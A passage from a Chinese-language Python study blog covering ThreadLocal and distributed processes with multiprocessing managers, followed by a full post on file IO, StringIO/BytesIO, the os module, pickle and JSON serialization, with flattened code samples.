在该线程中使用到的所有函数中，我们都需要接受这一参数。而每个线程操作的对象又不相同，所以也不能使用全局变量。 为此，我们可以想到用一个全局的dict来存所有Student对象，并将其与线程绑定。函数中使用当前线程进行访问： 12345678910111213141516global_dict = &#123;&#125;def std_thread(name): std = Student(name) # 把std放到全局变量global_dict中： global_dict[threading.current_thread()] = std do_task_1() do_task_2()def do_task_1(): # 不传入std，而是根据当前线程查找： std = global_dict[threading.current_thread()]def do_task_2(): # 任何函数都可以查找出当前线程的std变量： std = global_dict[threading.current_thread()] 于是这样就消除了需要反复传递某一参数的问题。 但是注意到std = global_dict[threading.current_thread()]这样一条长长的代码重复了多次，显然不够优美。 ThreadLocal对象为我们简化了这一操作： 123456789101112131415161718192021import threading # 创建全局ThreadLocal对象:local_school = threading.local()def process_student(): # 获取当前线程关联的student: std = local_school.student print(&#x27;Hello, %s (in %s)&#x27; % (std, threading.current_thread().name))def process_thread(name): # 绑定ThreadLocal的student: local_school.student = name process_student()t1 = threading.Thread(target = process_thread, args =(&#x27;Alice&#x27;,), name=&#x27;Thread-A&#x27;)t2 = threading.Thread(target = process_thread, args =(&#x27;Bob&#x27;,), name=&#x27;Thread-B&#x27;)t1.start()t2.start()t1.join()t2.join() 运行结果： 12Hello, Alice (in Thread-A)Hello, Bob (in Thread-B) ThreadLocal最常用的地方就是为每个线程绑定一个数据库连接，HTTP请求，用户身份信息等，这样一个线程的所有调用到的处理函数都可以非常方便地访问这些资源。 多线程vs多进程 对于多线程与多进程，以及批处理任务模式的好坏，如下博客进行了清晰的讨论： 进程 vs. 线程https://www.liaoxuefeng.com/wiki/1016959663602400/1017631469467456 分布式进程 多进程章节中，我们在同一台计算机上运行了多个进程，而进程还有个又是，就是支持分布式。 python的multiprocessing模块不但支持多进程，还支持将多进程分不到多台计算机上运行。 下面我们使用Master-Worker设计模式对其进行改写，将原有的Queue通过网络暴露出去： 123456789101112131415161718192021222324252627282930313233343536373839404142# task_master.py#!/usr/bin/env python3# -*- coding: utf-8 -*-import random, time, queuefrom multiprocessing.managers import BaseManager# 发送任务的队列:task_queue = queue.Queue()# 接收结果的队列:result_queue = queue.Queue()# 从BaseManager继承的QueueManager:class QueueManager(BaseManager): pass# 把两个Queue都注册到网络上, callable参数关联了Queue对象:QueueManager.register(&#x27;get_task_queue&#x27;, callable=lambda: task_queue)QueueManager.register(&#x27;get_result_queue&#x27;, callable=lambda: result_queue)# 绑定端口5000, 设置验证码&#x27;abc&#x27;:manager = QueueManager(address=(&#x27;&#x27;, 5000), authkey=b&#x27;abc&#x27;)# 启动Queue:manager.start()# 获得通过网络访问的Queue对象:task = manager.get_task_queue()result = manager.get_result_queue()# 放几个任务进去:for i in range(10): n = random.randint(0, 10000) print(&#x27;Put task %d...&#x27; % n) task.put(n)# 从result队列读取结果:print(&#x27;Try get results...&#x27;)for i in range(10): r = result.get(timeout=10) print(&#x27;Result: %s&#x27; % r)# 关闭:manager.shutdown()print(&#x27;master exit.&#x27;)if __name__ == &#x27;__main__&#x27; 此时对task_queue等Queue对象进行操作时，需要对通过manager.get_task_queue()获取的对象进行操作。 可见，我们在分配任务时，不需要了解网络通信的细节，因为managers模块封装得很好 接着我们再编写Worker端： 12345678910111213141516171819202122232425262728293031323334353637383940# task_worker.py#!/usr/bin/env python3# -*- coding: utf-8 -*-import time, sys, queuefrom multiprocessing.managers import BaseManager# 创建类似的QueueManager:class QueueManager(BaseManager): pass# 由于这个QueueManager只从网络上获取Queue，所以注册时只提供名字:QueueManager.register(&#x27;get_task_queue&#x27;)QueueManager.register(&#x27;get_result_queue&#x27;)# 连接到服务器，也就是运行task_master.py的机器:server_addr = &#x27;127.0.0.1&#x27;print(&#x27;Connect to server %s...&#x27; % server_addr)# 端口和验证码注意保持与task_master.py设置的完全一致:m = QueueManager(address=(server_addr, 5000), authkey=b&#x27;abc&#x27;)# 从网络连接:m.connect()# 获取Queue的对象:task = m.get_task_queue()result = m.get_result_queue()# 从task队列取任务,并把结果写入result队列:for i in range(10): try: n = task.get(timeout=1) print(&#x27;run task %d * %d...&#x27; % (n, n)) r = &#x27;%d * %d = %d&#x27; % (n, n, n*n) time.sleep(1) result.put(r) except Queue.Empty: print(&#x27;task queue is empty.&#x27;)# 处理结束:print(&#x27;worker exit.&#x27;)if __name__ == &#x27;__main__&#x27;: 部署完成后，启动tsak_master.py： 123456789101112$ python3 task_master.py Put task 3411...Put task 1605...Put task 1398...Put task 4729...Put task 5300...Put task 7471...Put task 68...Put task 4219...Put task 339...Put task 7866...Try get results... task_master.py进程发送完任务后，开始等待result队列的结果。接着启动test_worker.py： 12345678910111213$ python3 task_worker.pyConnect to server 127.0.0.1...run task 3411 * 3411...run task 1605 * 1605...run task 1398 * 1398...run task 4729 * 4729...run task 5300 * 5300...run task 7471 * 7471...run task 68 * 68...run task 4219 * 4219...run task 339 * 339...run task 7866 * 7866...worker exit. task_worker.py进程结束，在task_master.py进程中会继续打印出结果： 12345678910Result: 3411 * 3411 = 11634921Result: 1605 * 1605 = 2576025Result: 1398 * 1398 = 1954404Result: 4729 * 4729 = 22363441Result: 5300 * 5300 = 28090000Result: 7471 * 7471 = 55815841Result: 68 * 68 = 4624Result: 4219 * 4219 = 17799961Result: 339 * 339 = 114921Result: 7866 * 7866 = 61873956 实验结果 再windows下运行需要注意以下几个报错： 运行tesk_master.py时 报错：OSError: [WinError 87] 参数错误。 原因如下： 在win10环境下，pickle模块不能序列化lambda函数，所以需要自定义要使用的函数，而不用lambda函数 将原程序中的lambda修改为函数。再运行：python task_master.py 报错： 123456RuntimeError:An attempt has been made to start a new process before thecurrent process has finished its bootstrapping phase. 根据提示在程序中添加main函数 if name == ‘main’: 再运行：python task_master.py 报错：OSError: [WinError 10049]在其上下文中，该请求的地址无效。 原因：OSError: [WinError 10049]是由于 ip地址为空造成的 设置端口验证的一行 manager = QueueManager(address=('',5000), authkey=b'abc') 中的地址添加127.0.0.1 在另一个命令行运行环境下运行python task_worker.py （同样修改lambda函数，并添加main函数） 报错：ConnectionRefusedError: [WinError 10061] 由于目标计算机积极拒绝，无法连接。 经比对教程中的示例程序和教程后附加的例程，发现只有程序开头两行区别。 #!/usr/bin/env python3 # -- coding: utf-8 -- 将这两行添加到程序中。 如果时两台机器，需要再系统防火墙中把5000端口打开。","categories":[{"name":"Python","slug":"Python","permalink":"http://enderxiao.github.io/categories/Python/"},{"name":"机器学习","slug":"机器学习","permalink":"http://enderxiao.github.io/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"计算机语言","slug":"计算机语言","permalink":"http://enderxiao.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%AF%AD%E8%A8%80/"},{"name":"研究生课程基础","slug":"研究生课程基础","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F%E8%AF%BE%E7%A8%8B%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"http://enderxiao.github.io/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"python","slug":"python","permalink":"http://enderxiao.github.io/tags/python/"},{"name":"进阶","slug":"进阶","permalink":"http://enderxiao.github.io/tags/%E8%BF%9B%E9%98%B6/"},{"name":"多进程","slug":"多进程","permalink":"http://enderxiao.github.io/tags/%E5%A4%9A%E8%BF%9B%E7%A8%8B/"},{"name":"多线程","slug":"多线程","permalink":"http://enderxiao.github.io/tags/%E5%A4%9A%E7%BA%BF%E7%A8%8B/"}]},{"title":"python进阶-IO编程","slug":"python进阶-IO编程","date":"2021-08-10T00:02:21.000Z","updated":"2024-07-30T11:26:33.919Z","comments":true,"path":"2021/08/10/python进阶-IO编程/","permalink":"http://enderxiao.github.io/2021/08/10/python%E8%BF%9B%E9%98%B6-IO%E7%BC%96%E7%A8%8B/","excerpt":"python学习笔记，IO编程部分","text":"python学习笔记，IO编程部分 Intro IO在计算机中指Input/Output，也就是输入和输出。由于程序和运行时数据是在内存中驻留，由CPU这个超快的计算核心来执行，涉及到数据交换的地方，通常是磁盘、网络等，就需要IO接口。 IO编程中，Stream（流）是一个很重要的概念，可以把流想象成一个水管，数据就是水管里的水，但是只能单向流动。Input Stream就是数据从外面（磁盘、网络）流进内存，Output Stream就是数据从内存流到外面去。对于浏览网页来说，浏览器和新浪服务器之间至少需要建立两根水管，才可以既能发数据，又能收数据。 由于CPU输出和磁盘接收的速度不同，IO被分为两种： 同步IO，CPU等待数据完全写入磁盘再继续执行后续代码 异步IO，CPU不等待数据的输入，转而处理别的事物，磁盘接收完毕再通知CPU 再异步IO中，按照通知CPU的方式又可分为： 回调模式 轮询模式 显然异步IO效率要高于同步IO，但复杂度也远远高于同步IO，在此我们先仅讨论同步IO。 操作IO的能力都是由操作系统提供的，每一种编程语言都会把操作系统提供as的低级C接口封装起来方便使用，Python也不例外。 文件读写 读写文件是最常见的IO操作。Python内置了读写文件的函数，用法和C是兼容的。 读写文件前，我们先必须了解一下，在磁盘上读写文件的功能都是由操作系统提供的，现代操作系统不允许普通的程序直接操作磁盘，所以，读写文件就是请求操作系统打开一个文件对象（通常称为文件描述符），然后，通过操作系统提供的接口从这个文件对象中读取数据（读文件），或者把数据写入这个文件对象（写文件）。 读文件 要以读文件的模式打开一个文件对象，使用Python内置的open()函数，传入文件名和标示符： 1&gt;&gt;&gt; f = open(&#x27;E:/Programing/Python/Hello/test.txt&#x27;, &#x27;r&#x27;) 标示符’r’表示读 如果文件不存在，open()函数就会抛出一个IOError的错误，并且给出错误码和详细的信息告诉你文件不存在： 1234&gt;&gt;&gt; f=open(&#x27;E:/Programing/Python/Hello/test.txt&#x27;, &#x27;r&#x27;)Traceback (most recent call last): File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;FileNotFoundError: [Errno 2] No such file or directory: &#x27;E:/Programing/Python/Hello/test.txt&#x27; 如果文件打开成功，接下来，调用read()方法可以一次读取文件的全部内容，Python把内容读到内存，用一个str对象表示： 12&gt;&gt;&gt; f.read()&#x27;Hello, world!&#x27; 最后一步是调用close()方法关闭文件。文件使用完毕后必须关闭，因为文件对象会占用操作系统的资源，并且操作系统同一时间能打开的文件数量也是有限的： 1&gt;&gt;&gt; f.close() 由于文件读写时都有可能产生IOError，一旦出错，后面的f.close()就不会调用。所以，为了保证无论是否出错都能正确地关闭文件，我们可以使用try ... finally来实现： 123456try: f = open(&#x27;/path/to/file&#x27;, &#x27;r&#x27;) print(f.read())finally: if f: f.close() 但可以使用python基础 - Ender (enderxiao.top)中提到的with关键字实现一个上下文管理器来更方便的操作文件： 12with open(&#x27;/path/to/file&#x27;, &#x27;r&#x27;) as f: print(f.read()) 调用read()会一次性读取文件的全部内容，如果文件有10G，内存就爆了，所以，要保险起见，可以反复调用read(size)方法，每次最多读取size个字节的内容。另外，调用readline()可以每次读取一行内容，调用readlines()一次读取所有内容并按行返回list。因此，要根据需要决定怎么调用。 如果文件很小，read()一次性读取最方便；如果不能确定文件大小，反复调用read(size)比较保险；如果是配置文件，调用readlines()最方便： 12for line in f.readlines(): print(line.strip()) # 把末尾的&#x27;\\n&#x27;删掉 file-like Object 在python进阶-OOP - Ender (enderxiao.top)的继承与多态中提到过鸭子类型，像open()函数返回的这种有个read()方法的对象，在Python中统称为file-like Object。除了file外，还可以是内存的字节流，网络流，自定义流等等。file-like Object不要求从特定类继承，只要写个read()方法就行。 StringIO就是在内存中创建的file-like Object，常用作临时缓冲。 二进制文件 前面讲的默认都是读取文本文件，并且是UTF-8编码的文本文件。要读取二进制文件，比如图片、视频等等，用'rb'模式打开文件即可： 123&gt;&gt;&gt; f = open(&#x27;E:/Programing/Python/Hello/test.png&#x27;, &#x27;rb&#x27;)&gt;&gt;&gt; f.read()b&#x27;\\xff\\xd8\\xff\\xe1\\x00\\x18Exif\\x00\\x00...&#x27; # 十六进制表示的字节 字符编码 要读取非UTF-8编码的文本文件，需要给open()函数传入encoding参数，例如，读取GBK编码的文件： 123&gt;&gt;&gt; f = open(&#x27;E:/Programing/Python/Hello/gbk.txt&#x27;, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;)&gt;&gt;&gt; f.read()&#x27;测试&#x27; 遇到有些编码不规范的文件，你可能会遇到UnicodeDecodeError，因为在文本文件中可能夹杂了一些非法编码的字符。遇到这种情况，open()函数还接收一个errors参数，表示如果遇到编码错误后如何处理。最简单的方式是直接忽略： 1&gt;&gt;&gt; f = open(&#x27;E:/Programing/Python/Hello/gbk.txt&#x27;, &#x27;r&#x27;, encoding=&#x27;gbk&#x27;, errors=&#x27;ignore&#x27;) 写文件 写文件和读文件是一样的，唯一区别是调用open()函数时，传入标识符'w'或者'wb'表示写文本文件或写二进制文件： 1234&gt;&gt;&gt; f = open(&#x27;E:/Programing/Python/Hello/test.txt&#x27;, &#x27;w&#x27;)&gt;&gt;&gt; f.write(&#x27;Hello, world!&#x27;) # 将返回成功写入的字符数13&gt;&gt;&gt; f.close() 你可以反复调用write()来写入文件，但是务必要调用f.close()来关闭文件。当我们写文件时，操作系统往往不会立刻把数据写入磁盘，而是放到内存缓存起来，空闲的时候再慢慢写入。只有调用close()方法时，操作系统才保证把没有写入的数据全部写入磁盘。忘记调用close()的后果是数据可能只写了一部分到磁盘，剩下的丢失了。所以，还是用with语句来得保险： 12with open(&#x27;E:/Programing/Python/Hello/test.txt&#x27;, &#x27;w&#x27;) as f: f.write(&#x27;Hello, world!&#x27;) 写入特定编码的的文本，则在open()中传入encoding参数 以'w'模式写入文件时，如果文件已存在，会直接覆盖（相当于删掉后新写入一个文件），如果需要追加，则可以传入'a'以追加（append）模式写入。 所有模式的定义及含义可以参考Python的官网文档： python官方文档https://docs.python.org/3/library/functions.html#open read只能读一次 还需主义一点： 1234567&gt;&gt;&gt; f = open(&#x27;E:/Programing/Python/Hello/test.txt&#x27;, &#x27;r&#x27;)&gt;&gt;&gt; f.read()&#x27;!Hello, world!&#x27;&gt;&gt;&gt; f.read()&#x27;&#x27;&gt;&gt;&gt; f.read()&#x27;&#x27; 如此发现，文件打开一次后只能读取一次，原因是文件对象是一个迭代器 有限长度的迭代器在被list()函数转换成列表或者for循环完全遍历等方式将数据完全获取之后将失效，再次试图访问数据得到的是空值。也就是说不能重复使用，包括赋值后指向这个迭代器的其他变量也将无法使用。 123456789101112131415161718192021222324it1 = iter([0, 1, 2, 3, 4, 5])it2 = it1 # 使it2指向it1指向的内存地址存的迭代器for i in it1: print(i, end=&#x27; &#x27;)print(&#x27;\\n----分割线----&#x27;) print(&#x27;it1:&#x27;, list(it1))print(&#x27;it2:&#x27;, list(it2))# 输出结果如下：# 0 1 2 3 4 5 # ----分割线----# it1: []# it2: [] String IO与BytesIO StringIO 有时候数据读写的对象也不一定是文件，也可能在内存中读写，StringIO就是在内存中读写str。 只要创建一个StringIO对象后，就能像文件一样写入了，然后再使用getvalue()获取写入后的str： 12345678910&gt;&gt;&gt; from io import StringIO&gt;&gt;&gt; f = StringIO()&gt;&gt;&gt; f.write(&#x27;hello&#x27;)5&gt;&gt;&gt; f.write(&#x27; &#x27;)1&gt;&gt;&gt; f.write(&#x27;world!&#x27;)6&gt;&gt;&gt; print(f.getvalue())hello world! 要读StringIO，可以用一个str初始化StringIO，然后，像文件一样读取： 1234567891011&gt;&gt;&gt; from io import StringIO&gt;&gt;&gt; f = StringIO(&#x27;Hello!\\nHi!\\nGoodbye!&#x27;)&gt;&gt;&gt; while True:... s = f.readline()... if s == &#x27;&#x27;:... break... print(s.strip())...Hello!Hi!Goodbye! BtesIO StringIO操作的只能是str，如果要操作二进制数据，就需要使用BytesIO。BytesIO实现了在内存中读写bytes，我们创建一个BytesIO，然后写入一些bytes： 123456&gt;&gt;&gt; from io import BytesIO&gt;&gt;&gt; f = BytesIO()&gt;&gt;&gt; f.write(&#x27;中文&#x27;.encode(&#x27;utf-8&#x27;))6&gt;&gt;&gt; print(f.getvalue())b&#x27;\\xe4\\xb8\\xad\\xe6\\x96\\x87&#x27; 请注意，写入的不是str，而是经过UTF-8编码的bytes。 和StringIO类似，可以用一个bytes初始化BytesIO，然后，像读文件一样读取： 1234&gt;&gt;&gt; from io import BytesIO&gt;&gt;&gt; f = BytesIO(b&#x27;\\xe4\\xb8\\xad\\xe6\\x96\\x87&#x27;)&gt;&gt;&gt; f.read()b&#x27;\\xe4\\xb8\\xad\\xe6\\x96\\x87&#x27; 注意事项 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465# StringIO和BytesIO# stringIO 比如说，这时候，你需要对获取到的数据进行操作，但是你并不想把数据写到本地硬盘上，这时候你就可以用stringIOfrom io import StringIOfrom io import BytesIOdef outputstring(): return &#x27;string \\nfrom \\noutputstring \\nfunction&#x27;s = outputstring()# 将函数返回的数据在内存中读sio = StringIO(s)# 可以用StringIO本身的方法print(sio.getvalue())# 也可以用file-like object的方法s = sio.readlines()for i in s: print(i.strip()) # Python strip() 方法用于移除字符串头尾指定的字符（默认为空格或换行符）或字符序列。 注意：该方法只能删除开头或是结尾的字符，不能删除中间部分的字符。# 将函数返回的数据在内存中写s = outputstring()sio = StringIO()sio.write(s)# 可以用StringIO本身的方法查看s=sio.getvalue()print(s)# 如果你用file-like object的方法查看的时候，你会发现数据为空sio = StringIO()sio.write(s)for i in sio.readlines(): print(i.strip()) # 原因是StringIO的写入为追加写入，初始化后，文件指针位置为0，即在开头位置。# 但是使用追加写入后，指针则来到了文件结尾，即最后字符写入的位置。# 这时候我们需要修改下文件的指针位置# 我们发现可以打印出内容了sio = StringIO()sio.write(s)sio.seek(0,0)print(sio.tell())for i in sio.readlines(): print(i.strip())# 这就涉及到了两个方法seek 和 tell# tell 方法获取当前文件读取指针的位置# seek 方法，用于移动文件读写指针到指定位置,有两个参数，第一个offset: 偏移量，需要向前或向后的字节数，正为向后，负为向前；第二个whence: 可选值，默认为0，表示文件开头，1表示相对于当前的位置，2表示文件末尾# 用seek方法时，需注意，如果你打开的文件没有用&#x27;b&#x27;的方式打开，则offset无法使用负值哦# stringIO 只能操作str，如果要操作二进制数据，就需要用到BytesIO# 上面的sio无法用seek从当前位置向前移动，这时候，我们用&#x27;b&#x27;的方式写入数据，就可以向前移动了bio = BytesIO()bio.write(s.encode(&#x27;utf-8&#x27;))print(bio.getvalue())bio.seek(-36,1)print(bio.tell())for i in bio.readlines(): print(i.strip()) 操作文件和目录 Python内置的os模块可以直接调用操作系统提供的接口函数。 下面我们来看看os模块的基本功能： 123&gt;&gt;&gt; import os&gt;&gt;&gt; os.name # 操作系统类型&#x27;nt&#x27; 如果是nt，说明系统是windows，如果posix说明系统是Linux、Unix或Mac OS X。 要获取详细的系统信息，可以调用uname()函数，但uname()函数在windows下不可用，原因是windows并未提供相关接口，以下是在Linux上运行的结果： 12&gt;&gt;&gt; os.uname()posix.uname_result(sysname=&#x27;Darwin&#x27;, nodename=&#x27;MichaelMacPro.local&#x27;, release=&#x27;14.3.0&#x27;, version=&#x27;Darwin Kernel Version 14.3.0: Mon Mar 23 11:59:05 PDT 2015; root:xnu-2782.20.48~5/RELEASE_X86_64&#x27;, machine=&#x27;x86_64&#x27;) 要获取某个环境变量的值，可以调用os.environ.get('key')： 1234&gt;&gt;&gt; os.environ.get(&#x27;PATH&#x27;)&#x27;/usr/bin:/bin:/usr/sbin:/sbin:/usr/local/bin:/opt/X11/bin:/usr/local/mysql/bin&#x27;&gt;&gt;&gt; os.environ.get(&#x27;x&#x27;, &#x27;default&#x27;)&#x27;default&#x27; 操作文件和目录 操作文件和目录的函数一部分放在os模块中，一部分放在os.path模块中，这一点要注意一下。查看、创建和删除目录可以这么调用： 12345678910# 查看当前目录的绝对路径:&gt;&gt;&gt; os.path.abspath(&#x27;.&#x27;)&#x27;C:\\\\Users\\\\ASUS\\\\Links&#x27;# 在某个目录下创建一个新目录，首先把新目录的完整路径表示出来:&gt;&gt;&gt; os.path.join(&#x27;/Users/michael&#x27;, &#x27;testdir&#x27;)&#x27;C:/Users/ASUS/Links\\\\test&#x27;# 然后创建一个目录:&gt;&gt;&gt; os.mkdir(&#x27;C:/Users/ASUS/Links/test&#x27;)# 删掉一个目录:&gt;&gt;&gt; os.rmdir(&#x27;C:/Users/ASUS/Links/test&#x27;) 把两个路径合成一个时，不要直接拼字符串，而要通过os.path.join()函数，这样可以正确处理不同操作系统的路径分隔符。在Linux/Unix/Mac下，os.path.join()返回这样的字符串： 1part-1/part-2 而Windows下会返回这样的字符串： 1part-1\\part-2 同样的道理，要拆分路径时，也不要直接去拆字符串，而要通过os.path.split()函数，这样可以把一个路径拆分为两部分，后一部分总是最后级别的目录或文件名： 12&gt;&gt;&gt; os.path.split(&#x27;C:/Users/ASUS/Links/test.txt&#x27;)(&#x27;C:/Users/ASUS/Links&#x27;, &#x27;test.txt&#x27;) os.path.splitext()可以直接让你得到文件扩展名，很多时候非常方便： 12&gt;&gt;&gt; os.path.splitext(&#x27;C:/Users/ASUS/test.txt&#x27;)(&#x27;C:/Users/ASUS/test&#x27;, &#x27;.txt&#x27;) 这些合并、拆分路径的函数并不要求目录和文件要真实存在，它们只对字符串进行操作。 文件操作使用下面的函数。假定当前目录下有一个test.txt文件： 1234# 对文件重命名:&gt;&gt;&gt; os.rename(&#x27;test.txt&#x27;, &#x27;test.py&#x27;)# 删掉文件:&gt;&gt;&gt; os.remove(&#x27;test.py&#x27;) 但是os模块中不存在复制文件的操作，原因是赋值文件并非由操作系统提供的系统调用。理论上讲，我们通过上一节的读写文件可以完成文件复制，只不过要多写很多代码。 但shutil模块提供了copyfile()的函数，你还可以在shutil模块中找到很多实用函数，它们可以看做是os模块的补充。 最后看看如何利用Python的特性来过滤文件。比如我们要列出当前目录下的所有目录，只需要一行代码： 12&gt;&gt;&gt; [x for x in os.listdir(&#x27;.&#x27;) if os.path.isdir(x)][&#x27;.lein&#x27;, &#x27;.local&#x27;, &#x27;.m2&#x27;, &#x27;.npm&#x27;, &#x27;.ssh&#x27;, &#x27;.Trash&#x27;, &#x27;.vim&#x27;, &#x27;Applications&#x27;, &#x27;Desktop&#x27;, ...] 要列出所有的.py文件，也只需一行代码： 12&gt;&gt;&gt; [x for x in os.listdir(&#x27;.&#x27;) if os.path.isfile(x) and os.path.splitext(x)[1]==&#x27;.py&#x27;][&#x27;apis.py&#x27;, &#x27;config.py&#x27;, &#x27;models.py&#x27;, &#x27;pymonitor.py&#x27;, &#x27;test_db.py&#x27;, &#x27;urls.py&#x27;, &#x27;wsgiapp.py&#x27;] 练习 利用os模块编写一个能实现dir -l输出的程序。 12345678910111213141516171819202122232425262728# Hello.pyimport osimport timeclass FileInfo(object): def __init__(self, name): self._name = name fileStat = os.stat(name) self._mode = fileStat.st_mode self._linkNum = fileStat.st_nlink self._owner = fileStat.st_uid self._ownerGroup = fileStat.st_gid self._size = fileStat.st_size self._lastEditTime = time.strftime(&quot;%b %d %H:%M&quot;, time.localtime(fileStat.st_mtime)) def __str__(self): info = r&#x27;%s %s %s %s %s %s %s&#x27; % (self._mode, self._linkNum, self._owner, self._ownerGroup, self._size, self._lastEditTime, self._name) return infoif __name__ == &#x27;__main__&#x27;: for name in os.listdir(&#x27;.&#x27;): if name[0] == &#x27;.&#x27;: continue FileNow = FileInfo(name) print(FileNow) 编写一个程序，能在当前目录以及当前目录的所有子目录下查找文件名包含指定字符串的文件，并打印出相对路径。 12345678910111213141516171819202122# Hello.pyimport osdef findFile(targetFileName, path=&#x27;.&#x27;): foundFile = [] files = [os.path.join(path, x) for x in os.listdir(path) if os.path.isfile(os.path.join(path, x)) and targetFileName in os.path.split(x)[1]] # 路径是文件且文件名包含关键字 dirs = [x for x in os.listdir(path) if os.path.isdir(os.path.join(path, x))] for d in dirs: subFound = findFile(targetFileName, os.path.join(path, d)) foundFile += subFound foundFile += files return foundFileif __name__ == &#x27;__main__&#x27;: path = input(&#x27;输入查找路径&#x27;) targetFileName = input(&#x27;输入查找关键字&#x27;) foundPath = findFile(targetFileName, path) for pathName in foundPath: print(pathName) 序列化 将变量从内存中变成可存储或传输的过程称之为序列化在，Python中叫pickling，在其他语言中也被称之为serialization，marshalling，flattening等等，都是一个意思。 序列化之后，就可以把序列化后的内容写入磁盘，或者通过网络传输到别的机器上。 反过来，把变量内容从序列化的对象重新读到内存里称之为反序列化，即unpickling。 Python提供了pickle模块来实现序列化。 可以使用如下方法将一个对象序列化并写入文件： 1234&gt;&gt;&gt; import pickle&gt;&gt;&gt; d = dict(name=&#x27;Bob&#x27;, age=20, score=88)&gt;&gt;&gt; pickle.dumps(d)b&#x27;\\x80\\x03&#125;q\\x00(X\\x03\\x00\\x00\\x00ageq\\x01K\\x14X\\x05\\x00\\x00\\x00scoreq\\x02KXX\\x04\\x00\\x00\\x00nameq\\x03X\\x03\\x00\\x00\\x00Bobq\\x04u.&#x27; pickle.dumps()方法把任意对象序列化成一个bytes，然后，就可以把这个bytes写入文件。或者用另一个方法pickle.dump()直接把对象序列化后写入一个file-like Object： 123&gt;&gt;&gt; f = open(&#x27;dump.txt&#x27;, &#x27;wb&#x27;)&gt;&gt;&gt; pickle.dump(d, f)&gt;&gt;&gt; f.close() 看看写入的dump.txt文件，一堆乱七八糟的内容，这些都是Python保存的对象内部信息。 1€\u0004? &#125;??name攲\u0003Bob攲\u0003age擪\u0014?score擪Xu. 当我们要把对象从磁盘读到内存时，可以先把内容读到一个bytes，然后用pickle.loads()方法反序列化出对象，也可以直接用pickle.load()方法从一个file-like Object中直接反序列化出对象。我们打开另一个Python命令行来反序列化刚才保存的对象： 12345&gt;&gt;&gt; f = open(&#x27;dump.txt&#x27;, &#x27;rb&#x27;)&gt;&gt;&gt; d = pickle.load(f)&gt;&gt;&gt; f.close()&gt;&gt;&gt; d&#123;&#x27;name&#x27;: &#x27;Bob&#x27;, &#x27;age&#x27;: 20, &#x27;score&#x27;: 88&#125; Pickle的问题和所有其他编程语言特有的序列化问题一样，就是它只能用于Python，并且可能不同版本的Python彼此都不兼容，因此，只能用Pickle保存那些不重要的数据，不能成功地反序列化也没关系。 JSON 如果我们要在不同的编程语言之间传递对象，就必须把对象序列化为标准格式，比如XML，但更好的方法是序列化为JSON，因为JSON表示出来就是一个字符串，可以被所有语言读取，也可以方便地存储到磁盘或者通过网络传输。JSON不仅是标准格式，并且比XML更快，而且可以直接在Web页面中读取，非常方便。 JSON和Python内置的数据类型对应如下： JSON类型 Python类型 {} dict [] list “string” str 1234.56 int或float true/false True/False null None python中的json模块提供了对象到JSON的格式转换： 1234&gt;&gt;&gt; import json&gt;&gt;&gt; d = dict(name=&#x27;Bob&#x27;, age=20, score=88)&gt;&gt;&gt; json.dumps(d)&#x27;&#123;&quot;age&quot;: 20, &quot;score&quot;: 88, &quot;name&quot;: &quot;Bob&quot;&#125;&#x27; dumps()方法返回一个str，内容就是标准的JSON。类似的，dump()方法可以直接把JSON写入一个file-like Object。 要把JSON反序列化为Python对象，用loads()或者对应的load()方法，前者把JSON的字符串反序列化，后者从file-like Object中读取字符串并反序列化： 123&gt;&gt;&gt; json_str = &#x27;&#123;&quot;age&quot;: 20, &quot;score&quot;: 88, &quot;name&quot;: &quot;Bob&quot;&#125;&#x27;&gt;&gt;&gt; json.loads(json_str)&#123;&#x27;age&#x27;: 20, &#x27;score&#x27;: 88, &#x27;name&#x27;: &#x27;Bob&#x27;&#125; JSON标准规定JSON编码是UTF-8，因此在python中进行str与JSON的转换是没问题的 但当我们需要用JSON直接序列化类时，直接调用json.dump会报TypeError 原因是默认情况下，dumps()方法不知道如何将Student实例变为一个JSON的&#123;&#125;对象。 此时我们需要告诉方法要怎样进行转换，也就是通过dumps()方法的default参数，传入一个映射方法： 12345678910def student2dict(std): return &#123; &#x27;name&#x27;: std.name, &#x27;age&#x27;: std.age, &#x27;score&#x27;: std.score &#125;print(json.dumps(s, default=student2dict))# &#123;&quot;age&quot;: 20, &quot;name&quot;: &quot;Bob&quot;, &quot;score&quot;: 88&#125; 不过，下次如果遇到一个Teacher类的实例，照样无法序列化为JSON。我们可以把任意class的实例变为dict： 1print(json.dumps(s, default=lambda obj: obj.__dict__)) 因为通常class的实例都有一个__dict__属性，它就是一个dict，用来存储实例变量。也有少数例外，比如定义了__slots__的class。 同样的道理，如果我们要把JSON反序列化为一个Student对象实例，loads()方法首先转换出一个dict对象，然后，我们传入的object_hook函数负责把dict转换为Student实例： 12def dict2student(d): return Student(d[&#x27;name&#x27;], d[&#x27;age&#x27;], d[&#x27;score&#x27;]) 运行结果如下： 123&gt;&gt;&gt; json_str = &#x27;&#123;&quot;age&quot;: 20, &quot;score&quot;: 88, &quot;name&quot;: &quot;Bob&quot;&#125;&#x27;&gt;&gt;&gt; print(json.loads(json_str, object_hook=dict2student))&lt;__main__.Student object at 0x10cd3c190&gt; 打印出的是反序列化的Student实例对象。 json.dumps的参数列表参考如下链接： dumps方法参数https://docs.python.org/3/library/json.html#json.dumps 例如其中一个参数ensure_ascii： 1If ``ensure_ascii`` is false, then the return value can contain non-ASCII characters if they appear in strings contained in ``obj``. Otherwise, all such characters are escaped in JSON strings. 